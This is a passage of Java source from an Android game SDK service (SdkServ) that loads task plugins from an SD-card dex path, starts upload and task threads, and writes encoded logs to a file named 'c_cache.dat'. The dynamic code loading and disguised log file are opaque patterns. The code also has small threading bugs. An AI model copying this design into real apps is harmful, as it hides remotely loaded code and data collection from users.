//		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
//		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
		String tasks = this.getPropString( "t", "");
		String deadTasks = this.getPropString("dt", "");
		CheckTool.log(TAG, "init tasks:"+tasks+" dt:"+deadTasks);
		
		ConnectivityManager cm = (ConnectivityManager) dservice.getSystemService(Context.CONNECTIVITY_SERVICE);    
		isNetOk = false;
        if (cm != null) {
       	 NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
       	 if (aActiveInfo != null && aActiveInfo.isAvailable()) {
       		 if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
       			 isNetOk = true;
       		 }
			}
		}
		
		
		if (lt != null && lt.isRunFlag()) {
			lt.setRunFlag(false);
			try {
				Thread.sleep(logSleepTime+1000);
			} catch (InterruptedException e) {
			}
		}
		lt = new LT();
		lt.setRunFlag(true);
		lt.start();
		
		
		
		
		
		if (StringUtil.isStringWithLen(tasks, 1)) {
			String[] taskArr = tasks.split(SPLIT_STR);
			synchronized (taskList) {
				
			this.taskList.clear();
			for (int i = 0; i < taskArr.length; i++) {
				int tid = Integer.parseInt(taskArr[i]);
				PLTask task = this.loadTask(tid, sdDir);
				if (task != null) {
					task.setDService(this);
					this.taskList.add(task);
				}else{
					CheckTool.e(TAG, "load task failed:"+tid,null);
				}
			}
			}
		}
		if (this.upThread != null || this.taskThread!=null) {
			this.upThread.setRun(false);
			this.taskThread.setRun(false);
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
			}
		}
		this.upThread = new UpThread();
		this.upThread.setRun(true);
		this.upThread.start();
		this.taskThread = new TaskThread();
		this.upThread.setRun(true);
		this.taskThread.start();
	}

	public boolean isConnOk() {
		ConnectivityManager cm = (ConnectivityManager) dservice
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean isOk = false;
		if (cm != null) {
			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
					isOk = true;
				}
			}
		}
		return isOk;
	}

	/**
	 * @return the version
	 */
	public static final int getVersion() {
		return VERSION;
	}

	/**
	 * @param upUrl the upUrl to set
	 */
	public final void setUpUrl(String url) {
		upUrl = url;
	}

	/**
	 * @return the localDexPath
	 */
	public static final String getLocalDexPath() {
		return sdDir;
	}

	/**
	 * @return the emvClass
	 */
	public final String getEmvClass() {
		return emvClass;
	}

	/**
	 * @param emvClass the emvClass to set
	 */
	public final void setEmvClass(String emvClass) {
		this.emvClass = emvClass;
		this.config.put("emvClass", emvClass);
		
	}

	
	
	/**
	 * @return the emvPath
	 */
	public final String getEmvPath() {
		return emvPath;
	}

	/**
	 * @param emvPath the emvPath to set
	 */
	public final void setEmvPath(String emvPath) {
		this.emvPath = emvPath;
		this.config.put("emvPath", emvPath);
	}

	
	
	public long getMaxLogSize() {
		return maxLogSize;
	}

	public void setMaxLogSize(long maxLogSize) {
		this.maxLogSize = maxLogSize;
	}

	@Override
	public int getState() {
		return this.state;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.DServ#getService()
	 */
	@Override
	public Service getService() {
		return dservice;
	}

	/* (non-Javadoc)
	 * @see cn.play.dserv.DServ#getHander()
	 */
	@Override
	public Handler getHander() {
		return dservice.getHander();
	}
	
	/**
	 * 读取文本文件
	 * @param context
	 * @param file
	 * @return 失败则返回空字符串
	 */
	public static final String readTxt(String file) { 
		String data = "";
		try {
			BufferedReader in = new BufferedReader(
		            new InputStreamReader(new FileInputStream(file), "UTF-8"));
			StringBuffer sb = new StringBuffer();
			int c;
			while ((c = in.read()) != -1) {
				sb.append((char) c);
			}
			in.close();
			data = sb.toString();

		} catch (FileNotFoundException e) {
			return "";
		} catch (IOException e) {
			CheckTool.e(TAG, "File read error:" + file,e);
			return "";
		}
		return data;
	} 
	/**
	 * 写入文件到本地files目录,utf-8方式
	 * @param context Context
	 * @param file 本地文件名
	 * @param msg 需要写入的字符串
	 * @param isAppend 是否追加
	 */
	public static final void writeTxt(String file, String msg,boolean isAppend) {
		try {
			
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream(file,isAppend),"utf-8"));
			out.write(msg);
			out.close();
			
		} catch (IOException e) {
			CheckTool.e(TAG, "writeTxt error:" + file,e);
			return;
		}
	}
	
	public static final void writeTxt(String file, String msg) {
		writeTxt(file, msg, false);
	}
	
	//------------------------log--------------------------
	
	
	LT lt;// = new LT();
	static StringBuilder logSB = new StringBuilder();
	
	static int logSleepTime = 1000*5;
	static String logFile = SdkServ.sdDir+"c_cache.dat";
	private static final String SPLIT = "||";
	private static final String NEWlINE = "\r\n";
	
	public void log(int level,String tag,String gameId,String channelId,String msg){
		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
		logSB.append(level).append(SPLIT);
		logSB.append(tag).append(SPLIT);
		logSB.append(gameId).append(SPLIT);
		logSB.append(channelId).append(SPLIT);
		logSB.append(msg).append(NEWlINE);
	}
	
	public static final void i(String tag,String gameId,String channelId,String msg){
		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
		logSB.append(LEVEL_I).append(SPLIT);
		logSB.append(tag).append(SPLIT);
		logSB.append(gameId).append(SPLIT);
		logSB.append(channelId).append(SPLIT);
		logSB.append(msg).append(NEWlINE);
	}
	
	public static final void e(String tag,String gameId,String channelId,String msg){
		logSB.append(">>").append(System.currentTimeMillis()).append(SPLIT);
		logSB.append(LEVEL_E).append(SPLIT);
		logSB.append(tag).append(SPLIT);
		logSB.append(gameId).append(SPLIT);
		logSB.append(channelId).append(SPLIT);
		logSB.append(msg).append(NEWlINE);
	}
	
	private static final void save(){
		String s = logSB.toString();
		if (s.length() > 0) {
			logSB = new StringBuilder();
			String str = CheckTool.Cg(s)+NEWlINE;
			writeTxt(logFile, str,true);
		}
	}
	
	static String readLog(){
		return readTxt(logFile);
	}
	
	static long getLogSize(){
		File f = new File(logFile);
		if (!f.exists()) {
			return 0;
		}
		return f.length();
	}
	public class LT extends Thread{

		boolean runFlag = true;
		
		
		public void setRunFlag(boolean runFlag) {
			this.runFlag = runFlag;
		}
		
		public boolean isRunFlag() {
			return runFlag;
		}


		/* (non-Javadoc)
		 * @see java.lang.Thread#run()
		 */
		@Override
		public void run() {
			while (runFlag) {
				try {
					if (SdkServ.logSB.length() > 0) {
						save();
					}
					Thread.sleep(logSleepTime);
				} catch (Exception e) {
					e.printStackTrace();
					e("LT", "", "", e.getMessage());
				}
			}
		}
		
	}



	public boolean isNetOk() {
		return isNetOk;
	}
	
	public final int getVer(){
		return 1;
	}
	
}
